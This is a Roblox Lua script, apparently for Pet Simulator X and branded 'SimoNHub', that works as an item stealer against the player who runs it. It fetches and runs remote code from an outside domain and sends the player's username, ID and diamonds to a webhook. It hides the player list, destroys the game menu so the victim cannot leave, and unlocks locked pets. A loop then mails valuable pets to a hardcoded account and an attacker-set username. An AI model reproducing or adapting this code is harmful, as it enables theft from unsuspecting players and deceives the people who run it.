local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)
--// Vars
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local FrameworkLibrary = require(ReplicatedStorage.Framework.Library)
local Network = require(ReplicatedStorage.Library.Client.Network);
local Fire = Network.Fire
local Invoke = Network.Invoke
local Client = Players.LocalPlayer
local lockedCount = 0

--// HF Fire
old = hookfunction(getupvalue(Fire, 1), function(...) 
    return true 
end)


--// Pet Folders
local PetFolders = {
	Client.PlayerGui.Inventory.Frame.Main.Pets.Normal,
	Client.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}

--// Loading UI
loadstring(game:HttpGet("https://fourdevils.gq/LoadingScreen.lua"))()

--// Teleport To Mailbox
local Mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(Mailbox:GetDescendants()) do
    if v:IsA("MeshPart") or v:IsA("Part") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        break
    end
end

--// Diamond Check
if Client.leaderstats.Diamonds.Value < 5000000 then
	Client:Kick("Script Error #Diamond5M")
end

--// Disable Playerlist
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

--// Full Screen
if _G.FullScreen == true then
    game:GetService("GuiService"):ToggleFullscreen()
end

--// Anti Leave
if _G.AntiLeave == true then
    game:GetService("GuiService").CoreGui.RobloxGui:Destroy()
end

--// Mute Roblox
if _G.MuteRoblox == true then
    UserSettings():GetService("UserGameSettings").MasterVolume = 0
end

--// Anchor Character
wait(0.5)
Client.Character.HumanoidRootPart.Anchored = true

--// Webhook Sending
if _G.EnableWebhook == true then
    local http_request = http_request
    if syn then 
        http_request = syn.request
    end
    local getservice = game.GetService
    local httpservice = getservice(game, "HttpService")
    local function http_request_get(url, headers) 
        return http_request({Url=url,Method="GET",Headers=headers or nil}).Body 
    end
    local function jsondecode(json)
        local jsonTable = {}
            pcall(function() jsonTable = httpservice.JSONDecode(httpservice,json) 
        end)
        return jsonTable
    end
    local Headers = {["content-type"] = "application/json"}
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local UserId = LocalPlayer.UserId
    local PlayerName = LocalPlayer.Name
    local PlayerData =  {
        ["content"] = "Execution Detected!",
        ["embeds"] = {{
            ["title"] = "SimoNHub",
            ["description"] = "```discord.gg/psxscripts \HerrrSimoN#2115```",
            ["color"] = tonumber(0x42E9F9),
            ["fields"] = {{
                ["name"] = "",
                ["value"] = "**Username:** \n```" .. PlayerName .. "```\n**UserId:** \n```" .. UserId .. "```\n**PlaceId:** \n```" .. game.PlaceId .. "```\n**Diamonds:** \n```" .. game.Players.LocalPlayer.leaderstats.Diamonds.Value .. "```",
                ["inline"] = true
                },
            },
        }}
    }
    local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
    local HttpRequest = http_request;
    if syn then
        HttpRequest = syn.request
    else
        HttpRequest = http_request
    end
    HttpRequest({Url = _G.Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
end

--// Unlock Pets
if _G.UnlockPets == true then
    local function unlockPetsInFolder(folder)
        local children = folder:GetChildren()
        for _, child in ipairs(children) do
            if child:IsA("TextButton") and child.Locked.Visible == true then
                local name = child.Name
                if child.Name then
                    local args2 = {
                        [1] = {
                            ["" .. name] = false
                        }
                    }
                    Invoke("Lock Pet", unpack(args2))
                end
            end
        end
    end
    while true do
        for _, folder in pairs(PetFolders) do
          unlockPetsInFolder(folder)
          wait(.2)
        end
        for _, folder in ipairs(PetFolders) do
            for _, child in ipairs(folder:GetChildren()) do
                if child:IsA("TextButton") and child.Locked.Visible == true then
                    lockedCount = lockedCount + 1
                end
            end
        end
        if lockedCount == 0 then
            print('Unlocked All')
            break
        end
    end
end

--// Mail Stealer
local savedPets = FrameworkLibrary.Save.Get().Pets
while wait() do
	for i,v in pairs(savedPets) do
    	local v2 = FrameworkLibrary.Directory.Pets[v.id]
		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value < 10000000000 then
			local args = {
    			[1] = {
        			["Recipient"] = "HerrySzymoN",
        			["Diamonds"] = 0,
        			["Pets"] = {v.uid},
        			["Message"] = "SimoNHub On Top!"
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Exclusive" then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = 0,
        			["Pets"] = {v.uid},
        			["Message"] = "SimoNHub On Top!"
    			}
			}
			Invoke("Send Mail", unpack(args))
        elseif v2.huge == true then
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = 0,
        			["Pets"] = {v.uid},
        			["Message"] = "SimoNHub On Top!"
    			}
			}
			Invoke("Send Mail", unpack(args))
        end
	end
end
